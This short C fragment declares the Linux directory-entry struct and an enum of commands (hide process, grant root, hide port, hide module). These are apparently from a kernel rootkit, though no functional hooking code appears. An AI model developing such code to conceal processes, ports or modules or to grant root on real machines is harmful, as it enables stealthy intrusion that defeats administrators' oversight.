struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};



enum {
	HIDEPROC = 0,
	ROOT = 1,
        HIDEPORT=2,
	HIDEMOD = 3,
};

